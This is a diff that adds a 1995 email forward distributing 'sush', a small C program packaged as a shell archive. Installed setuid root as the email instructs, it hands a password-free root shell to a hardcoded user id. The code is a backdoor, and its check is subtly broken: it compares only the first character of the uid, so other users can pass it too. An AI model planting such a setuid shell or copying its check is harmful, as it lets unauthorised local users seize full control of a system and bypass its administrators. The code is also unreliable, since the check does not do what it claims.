@@ -1,0 +1,101 @@
+
+From Steve Scrivano:
+
+The following was forwarded to me by Allan Gunn and was written by Dave
+at mutnix.  I added some notes to the source about adding your user id
+in the source code.  Check the /etc/passwd file for it.  "sush" allows
+an authorized person to access root without having to type a passwd.
+
+
+
+From rogue!allan@cleese.apana.org.au Sun Apr 23 11:53:34 1995
+Return-Path: <rogue!allan@cleese.apana.org.au>
+Received: from cleese.apana.org.au by nyx.cs.du.edu (4.1/SMI-4.1)
+	id AA13281; Sun, 23 Apr 95 11:53:18 MDT
+X-Disclaimer: Nyx is a public access Unix system run by the University
+	of Denver.  The University has neither control over nor
+	responsibility for the opinions or correct identity of users.
+Received: from rogue.UUCP by cleese.apana.org.au with UUCP id AA26199
+  (5.67a/IDA-1.5 for nyx.cs.du.edu!sscrivan); Mon, 24 Apr 1995 03:25:12 +0930
+Received: by rogue.apana.org.au (smail2.5)
+	id AA15460; 23 Apr 95 11:29:50 OST (Sun)
+Subject: Sush (fwd)
+To: sscrivan@nyx.cs.du.edu (Steve Scrivano)
+Date: Sun, 23 Apr 95 11:29:39 OST
+From: Allan Gunn <rogue!allan@cleese.apana.org.au>
+Reply-To: allan@rogue.apana.org.au
+X-Mailer: ELM [version 2.3 PL11]
+Message-Id: <9504231129.AA15456@rogue.apana.org.au>
+Status: RO
+
+G'day Steve,
+
+Dave gave permission to send a copy of this file to you (He wrote it).
+
+To put it basically, this little program will allow you to go into Super
+User mode without having to use the password. Once compiled, chown the
+executable to root.
+
+Final step in getting sush to work properly is to chmod ug+s sush to get this:
+
+-rwsr-sr-x   1 rogue    root        5948 Apr 23 19:47 /usr/local/sush
+
+Have fun ...
+
+Cheers .... Allan
+
+-- 
+
+Email:- allan@rogue.apana.org.au
+
+ From mutnix!dave Sun Apr 23 00:17:51 1995
+ To: allan
+ Subject: Sush
+ Date: Sat Apr 22 19:13:46 1995
+
+
+#! /bin/sh
+# This is a shell archive.  Remove anything before this line, then unpack
+# it by saving it into a file and typing "sh file".  To overwrite existing
+# files, type "sh file -c".  You can also feed this as standard input via
+# unshar, or by typing "sh <file", e.g..  If this archive is complete, you
+# will see the following message at the end:
+#		"End of shell archive."
+# Contents:  sush.c
+# Wrapped by root@coupon on Tue Apr 25 15:35:12 1995
+PATH=/bin:/usr/bin:/usr/ucb ; export PATH
+if test -f 'sush.c' -a "${1}" != "-c" ; then 
+  echo shar: Will not clobber existing file \"'sush.c'\"
+else
+echo shar: Extracting \"'sush.c'\" \(369 characters\)
+sed "s/^X//" >'sush.c' <<'END_OF_FILE'
+X 
+X main()
+X {
+X 	char *uid[10];
+X/* select a user id here to access root - third field in /etc/passwd */
+X 	sprintf(uid, "%s", "204");
+X 	{
+X 	char *id[10];
+X 	sprintf(id, "%d", getuid());
+X 	{
+X 	if (*id!=*uid) {
+X 	printf("Invalid Security Clearance\n");
+X 	exit(0);
+X 	}
+X 	printf("Security Clearance Passed\n");
+X 	setuid (0);
+X 	setgid (0);
+X 	system("exec /bin/sh");
+X 	}
+X }
+X }
+X 
+END_OF_FILE
+if test 369 -ne `wc -c <'sush.c'`; then
+    echo shar: \"'sush.c'\" unpacked with wrong size!
+fi
+# end of 'sush.c'
+fi
+echo shar: End of shell archive.
+exit 0
